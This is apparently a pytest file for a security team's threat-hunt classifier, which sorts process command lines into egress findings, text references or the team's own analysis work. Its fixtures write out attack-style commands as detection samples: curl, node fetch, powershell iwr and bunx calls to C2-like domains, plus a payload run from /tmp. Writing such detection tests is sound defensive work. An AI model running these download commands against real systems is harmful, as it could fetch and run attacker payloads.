"""Probes for the command-line classifier in scripts/hunt/hunt_advisory_iocs.py.

Written on 2026-08-11, after this collector reported FINDINGS at critical severity on five
rows that were the security team testing this collector. Every one of them was a `python3`
heredoc importing this module to exercise `classify_command_line`, and because the classifier
checked the TOOL before the PATH, python won and the hunt reported itself as a C2 contact.

`hunt_antiremediation.py` had already solved this - it demoted 247 rows of the same kind on
the same estate in the same cycle - so the fix was to stop keeping two divergent copies of one
judgement. These probes exist so the two cannot drift apart again silently.

The whole point of the class is that it DEMOTES rather than deletes, so the tests below pin
both halves: that our own instrumentation stops being a finding, and that nothing else does.
"""

import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "scripts/hunt"))

H = pytest.importorskip("hunt_advisory_iocs")


def _cmd(command_line, **extra):
    row = {"ProcessCommandLine": command_line}
    row.update(extra)
    return row


# ----------------------------------------------------------------------------------
# The regression itself.
# ----------------------------------------------------------------------------------

def test_our_own_test_harness_is_not_a_c2_contact():
    """The exact shape that produced five critical findings on one analyst workstation."""
    row = _cmd(
        "/bin/zsh -c 'source /Users/x/.claude/shell-snapshots/snapshot-zsh-1786371858618.sh "
        "&& eval 'cd \"/Users/x/Documents/auditgithub\" && python3 - <<PY\n"
        "m=importlib.import_module('scripts.hunt.hunt_advisory_iocs')\n"
        "tests = [(\"curl to C2\", {\"ProcessCommandLine\":\"curl -s https://npm-cache.com/x\"})]\nPY'")
    assert H.classify_command_line(row) == H.ANALYSIS


def test_the_path_decides_and_not_the_tool():
    """The ordering bug in one line, and it is subtler than "python is egress-capable".

    What actually happened: the heredoc being run contained the STRING
    `curl -s https://npm-cache.com/x` as a test fixture for this classifier. `curl` is an
    egress tool, the scan is over the whole command line as flat text, and a tool-first
    order therefore promoted a quoted test literal into a critical C2 finding. The tool
    genuinely is present in the text; that is exactly why the tool cannot be the
    discriminator. The path being worked in can.
    """
    quoted_fixture = "python3 - <<PY\ntests=[\"curl -s https://npm-cache.com/x\"]\nPY"
    assert H.classify_command_line(_cmd(quoted_fixture)) == H.EGRESS
    assert H.classify_command_line(
        _cmd(f"cd /app/auditgithub && {quoted_fixture}")) == H.ANALYSIS


def test_reading_the_indicator_corpus_is_ours_however_it_is_read():
    """No read tool is required. A shell loop over github_conf/ioc is still us."""
    for command in ("rg -l npm-cache.com github_conf/ioc/",
                    "for f in github_conf/ioc/*.json; do echo $f; done",
                    "cat docs/playbooks/supply-chain-hunt-ttp.md"):
        assert H.classify_command_line(_cmd(command)) == H.ANALYSIS


# ----------------------------------------------------------------------------------
# The other half: a demotion that swallows real traffic is worse than the bug it fixed.
# ----------------------------------------------------------------------------------

def test_a_real_fetch_is_still_a_finding_on_an_analysts_own_laptop():
    """The markers are paths, not a device allowlist.

    This is the failure this demotion could plausibly introduce: excusing the security
    team's machine. It does not - no marker appears in a bare curl, wherever it ran.
    """
    assert H.classify_command_line(
        _cmd("curl -s https://npm-cache.com/router -o /tmp/a")) == H.EGRESS


def test_a_payload_shape_is_still_a_finding():
    for command in ("/tmp/bun-1.3.13/bun setup.mjs",
                    "node -e \"fetch('https://pypi-get.com')\"",
                    "bunx js-mirror.com/p",
                    "powershell -c iwr https://js-mirror.com"):
        assert H.classify_command_line(_cmd(command)) == H.EGRESS


def test_an_unrecognised_shape_is_reported_rather_than_cleared():
    """The default has to fail loud. A classifier that has never seen a shape must not
    decide it is safe."""
    assert H.classify_command_line(_cmd("weirdproc npm-cache.com")) == H.EGRESS


def test_a_search_command_outside_our_corpus_is_a_text_reference_not_ours():
    """The two demotion classes are distinct and must not collapse into each other.

    Someone grepping their own notes for the C2 domain is a text reference. Only work
    inside this repository's corpus is `analysis_corpus_reference`, because that is the
    claim the class actually makes.
    """
    assert H.classify_command_line(
        _cmd("grep npm-cache.com /Users/x/notes/incident.txt")) == H.TEXT


# ----------------------------------------------------------------------------------
# The indicator-stripping rule that predates all of this, pinned so it is not lost.
# ----------------------------------------------------------------------------------

def test_the_indicator_is_stripped_before_the_tool_scan():
    """`npm-cache.com` contains `npm`. Without stripping, every mention of the C2 domain
    reads as an npm invocation - which is how a grep for the IOC becomes an IOC."""
    assert H.classify_command_line(
        _cmd("grep npm-cache.com /Users/x/notes.txt")) != H.EGRESS


def test_the_three_classes_are_distinct_values():
    assert len({H.EGRESS, H.TEXT, H.ANALYSIS}) == 3
